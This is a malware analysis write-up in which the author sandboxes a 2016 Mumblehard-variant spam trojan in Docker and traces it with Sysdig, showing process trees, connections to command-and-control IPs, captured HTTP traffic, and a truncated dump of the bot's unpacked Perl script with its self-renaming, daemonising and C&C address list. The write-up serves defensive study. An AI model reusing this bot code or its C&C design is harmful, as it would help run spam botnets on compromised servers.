# Sysdig for malware unpacking

This short article relates how we easily spotted a malware and what it was doing by using Sysdig.

## Context

Back in 2016, a customer informed us his main server, a shared PHP hosting, had a very very bad IP reputation, declared everywhere as huge spammer. They asked for help to understand and fix.

A simple `ps -ef` revealed tens of `httpd` processus, strange behavior for a Debian *(Note : `httpd` is name of web service `apache2` on a RedHat-like OS)*. We cleaned it up and started digging.

First, we found an unwanted `cron` line for user `www-data` : 

```bash
*/15 * * * * /var/tmp/IsvAvGKe
```

We removed that line and I kept that binary in my pocket. Until today.

Some weeks ago, cleaning up my laptop I found back this binary, I always wanted to write about this story and kindness of Sysdig's people on Slack decided me to do so. Big up to you guys.

I didn't kept captures we made, but I'll try to reproduce in this article our actions and see what we can find now, just for fun.

## For start

```bash
file IsvAvGKe

IsvAvGKe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

So, this is a `ELF` binary but as dissecting binary is not my speciality, I prefer choosing another way : **run the binary in a sandbox and capture all I can with Sysdig**.

## Set up my sandbox

Nothing special here, will run the binary inside a `Docker` container.  It provides a controlable and isolated environment, and sysdig's filters permit us to easily captures its inputs and outputs :

- An **AWS EC2** Instance
- **Docker** installed on it (https://docs.docker.com/install/)
- **Sysdig** installed on it (https://github.com/draios/sysdig/wiki/How-to-Install-Sysdig-for-Linux)

In a first terminal, I will spawn a `debian` container (to be relevant to our customer's environment) with our binary mounted inside (obvious) :

```bash
docker run -ti --rm -u www-data -v /tmp/IsvAvGKe:/tmp/IsvAvGKe:ro debian /bin/bash

www-data@f2fdea26303a:/$
```
- `run` execute a command inside a docker
- `-ti` attach a `tty` and open `stdin`
- `--rm` remove container after exit
- `-u data` run container as `www-data` user
- `-v /tmp/IsvAvGKe:/tmp/IsvAvGKe:ro` mount our binary inside
- `debian` image to use
- `/bin/bash` command to execute

*Note : user `www-data` already exists in official `debian` image, I add `-u` option to be logged in as it, to be relevant with the real env again.*

## Start our capture

In a second terminal, directly on host, I'm starting a 30s capture :

```bash
sysdig -z -s 8192 -M 30 -w /tmp/scap.gz container.id=f2fdea26303a
```
- `-z` compress capture
- `-s 2048` first 8192 bits of earch I/O buffer are captured
- `-M 30` limit capture to 30s
- `-w /tmp/scap.gz` where to write the capture
- `container.id=f2fdea26303a` filter to get syscall from only our sandbox container and avoid noise from host

Quickly, in my first terminal, inside the docker container :

```bash
/tmp/IsvAvGKe
```

And that's it. I can start now exploring my capture : 

```bash
ls -l /tmp/scap.gz
-rw-r--r-- 1 root root 171449 Apr 30 09:14 /tmp/scap.gz
```

## Digging

In 2016, `sysdig inspect` didn't exist, so we used only `sysdig`'s chisels in CLI, for this article, I will do both.

### With CLI

#### List running processus 

```bash
sysdig -r /tmp/scap.gz -p "name=%proc.name pid=%proc.pid ppid=%proc.ppid" | sort -u

name=IsvAvGKe pid=13991 ppid=13886
name=IsvAvGKe pid=13992 ppid=13886
name=bash pid=13886 ppid=13859
name=bash pid=13991 ppid=13886
name=perl pid=13992 ppid=13886
name=qmail pid=13993 ppid=13992
```

I discover a `qmail` process, however I do know that my container is not able to send emails, the name is faked for sure. This processus is created by our mysterious binary and according to parentings, it appears our it is obfuscating a `perl` script.

I can also have more details by filtering on only `exec` and `fork` calls :

```bash
sysdig -r /tmp/scap.gz -p"%evt.time %evt.dir user=%user.name evt=%evt.type proc.name=%proc.name pid=%proc.pid ppid=%proc.ppid" "(evt.type=clone or evt.type=execve)"

09:49:44.193092248 > user=www-data evt=clone proc.name=bash pid=13026 ppid=13001
09:49:44.193212631 < user=www-data evt=clone proc.name=bash pid=13026 ppid=13001
09:49:44.193286068 < user=www-data evt=clone proc.name=bash pid=13429 ppid=13026
09:49:44.193410426 > user=www-data evt=execve proc.name=bash pid=13429 ppid=13026
09:49:44.193551532 < user=www-data evt=execve proc.name=IsvAvGKe pid=13429 ppid=13026
09:49:44.193647684 > user=www-data evt=execve proc.name=IsvAvGKe pid=13430 ppid=13429
09:49:44.193739961 < user=www-data evt=execve proc.name=perl pid=13430 ppid=13429
09:49:44.225541020 > user=www-data evt=clone proc.name=perl pid=13430 ppid=13429
09:49:44.225684395 < user=www-data evt=clone proc.name=perl pid=13430 ppid=13429
09:49:44.225732075 < user=www-data evt=clone proc.name=qmail pid=13431 ppid=13430
```

#### Outbound connections

I take a look on connections from our container :

```bash
sysdig -r /tmp/scap.gz -A  evt.type=connect and evt.dir="<"

2164 10:02:03.028972855 1 qmail (13993) < connect res=-115(EINPROGRESS) tuple=172.17.0.2:54978->31.220.18.115:80
2355 10:02:03.292168852 1 qmail (13993) < connect res=-115(EINPROGRESS) tuple=172.17.0.2:48444->5.101.142.81:80
7923 10:02:14.006776068 1 qmail (13993) < connect res=-115(EINPROGRESS) tuple=172.17.0.2:38746->5.2.86.225:80
8084 10:02:14.189004756 1 qmail (13993) < connect res=-115(EINPROGRESS) tuple=172.17.0.2:39390->5.135.42.98:80
13695 10:02:25.005251042 1 qmail (13993) < connect res=-115(EINPROGRESS) tuple=172.17.0.2:33678->50.7.133.245:80
```

It tried to connect on 5 IPS. 

```bash
sysdig -r /tmp/scap.gz -c topconns
Bytes               Proto               Conn
--------------------------------------------------------------------------------
690B                tcp                 172.17.0.2:38658->5.2.86.225:80
569B                tcp                 172.17.0.2:54888->31.220.18.115:80
```

Only two connections have been successfully made on port 80 of 2 different remote IPs (`5.2.86.225`, `31.220.18.115`). Port and Protocol (`tcp`) argue these are HTTP requests, so let's check that :

```bash
sysdig -r /tmp/scap.gz -A -c echo_fds fd.port=80

------ Write 325B to   172.17.0.2:54888->31.220.18.115:80 (qmail)

GET / HTTP/1.1
Host: 31.220.18.115
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.8,*/*;q=0.9
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: close

------ Read 244B from   172.17.0.2:54888->31.220.18.115:80 (qmail)

HTTP/1.1 200 OK
Date: Tue, 30 Apr 2019 09:14:01 GMT
Server: Apache/2.4.7 (Ubuntu)
Last-Modified: Tue, 01 Nov 2016 14:21:13 GMT
ETag: "1-5403e096eb454"
Accept-Ranges: bytes
Content-Length: 1
Connection: close
Content-Type: text/html

------ Write 322B to   172.17.0.2:38658->5.2.86.225:80 (qmail)

GET / HTTP/1.1
Host: 5.2.86.225
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.8,*/*;q=0.9
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: close

------ Read 368B from   172.17.0.2:38658->5.2.86.225:80 (qmail)

HTTP/1.1 200 OK
Date: Tue, 30 Apr 2019 09:14:12 GMT
Server: Apache
Last-Modified: Wed, 30 Jan 2019 02:03:25 GMT
Accept-Ranges: bytes
Content-Length: 163
Connection: close
Content-Type: text/html

<html><head><META HTTP-EQUIV="Cache-control" CONTENT="no-cache"><META HTTP-EQUIV="refresh" CONTENT="0;URL=/cgi-sys/defaultwebpage.cgi"></head><body></body></html>
```

We do have HTTP requests and reponses, and requests sent by `qmail` as thought before. Not so much usefull data from responses, but almost 3 years after, let's say it's for better.

#### Undiscover the perl script

I saw that a `perl` process is runned, except if it's also a faked name, I could be able to read the script it reads in buffer, as I captured a lot of bits for each I/O.

```bash
sysdig -r /tmp/scap.gz -A -c echo_fds evt.is_io_read=true and proc.pid=13992 and not "fd.directory contains /lib"
------ Read 4B from   /dev/urandom (perl)

:ac|
------ Read 5.60KB from   /dev/pts/0 (perl)

use strict; use POSIX; use IO::Socket; use IO::Select; $0 = "qmail"; $| = 1; my $ewblock = 11; my $eiprogr = 150; if ($^O eq "linux") { $ewblock = 11; $eiprogr = 115; }
if ($^O eq "freebsd") { $ewblock = 35; $eiprogr = 36; } &main(); sub main { exit 0 unless defined (my $pid = fork); exit 0 if $pid; POSIX::setsid();
$SIG{$_} = "IGNORE" for (qw (HUP INT ILL FPE QUIT ABRT USR1 SEGV USR2 PIPE ALRM TERM CHLD)); umask 0; chdir "/"; open (STDIN, "</dev/null"); open (STDOUT, ">/dev/null"); open (STDERR, ">&STDOUT");
my $url = ["31.220.18.115","5.101.142.81","5.2.86.225","5.135.42.98","50.7.133.245","5.9.157.230"]; my $tst = ["a".."z", "A".."Z"]; $tst = join ("", @$tst[map {rand @$tst}(1..(6 + int rand 5))]); my $dir = "/var/tmp"; if (open (F, ">", "/tmp/$tst")) { close F; unlink "/tmp/$tst"; $dir ="/tmp"; }
my ($header, $content); my ($link, $file, $id, $command, $timeout) = ("en.wikipedia.org", "index.html", 1, 96, 10);
foreach my $rs (@$url) { $header = "$dir/" . time; $content = $header . "1"; unlink $header if -f $header; unlink $content if -f $content; &http($rs, $timeout, $header, $content, 0);

[truncated]
```

Awesome ! By filtering for removing `.*/lib/.*` folder I easily spot the only script which is read by `perl` process. No need to do complicated reverse engineering, magic of *Sysdig* does all hard work for me.

A simple glance shows :
- `$0 = "qmail";` the perl script changes its name for `qmail` as seen in processlist
- `$url = ["31.220.18.115","5.101.142.81","5.2.86.225","5.135.42.98","50.7.133.245","5.9.157.230"]` contacted IP are set here, in a array.

I could dig much deeper but it's enough clues for googling and find our guilty : `mumblehard`. A spam malware which has been discovered and take down in 2015 by ESET : https://www.welivesecurity.com/wp-content/uploads/2015/04/mumblehard.pdf

Their study indicates me that we faced a forked version because notified IPs of C&C are not matching. It explains why our customer's server was still sending spams even in 2016, almost year after the official dismantlement of the botnet.

For people who want the full `perl` script (for research purpose only, of course) : http://hardwarefetish.com/681-mumblehard-c-trojan-unpacked

### With Sysdig Inspect

I showed how to explore the capture directly with **Sysdig** but I can do that graphically now with **Sysdig Inspect**, a nice GUI.

#### Overview

**Sysdig Inspect** gives me quick overview of what happened in my capture :

![screenshot_1](screenshot_1.png)

I see 2 HTTP requests over 5 Outbound Connections, some accessed, modified and deleted files and processus forks. Only one container is notified, as we filtered on it while capturing. 

#### Processus

I filter on my container (double-click on its row) and select *Processus* view :

![screenshot_2](screenshot_2.png)

#### HTTP Requests

Overview indicated me 5 Outbound Connections, here their details :

![screenshot_3](screenshot_3.png)

Only 2 succeeded :

![screenshot_4](screenshot_4.png)

#### Find back the perl script

I start by listing all readen files :

![screenshot_5](screenshot_5.png)

The majority of opened files are from perl libraries, but I see also a strange input from `/dev/pts/0`, as I runned only one command in my docker, this can't be me directly :

![screenshot_6](screenshot_6.png)

Spotted !

## Conclusion

I didn't kept catpures we made in 2016, but in 
sentences, we were able to see the download and launch of spaming process (as `httpd`), the requests to C&C and its orders (in HTTP but on port 25 for covering up its actions) and at last the list of emails to spam. It was really impressive to get all data we so few commands and in a so much understanble output. 

Thanks for this awesome tool. :heart:

Hope you enjoyed this small article and discovered some tips for working with **Sysdig**. 

## Post Scriptum 

You can find ma capture [capture](scap.gz) to play with it and reproduced my steps.

## Author

Thomas Labarussias - https://github.com/Issif





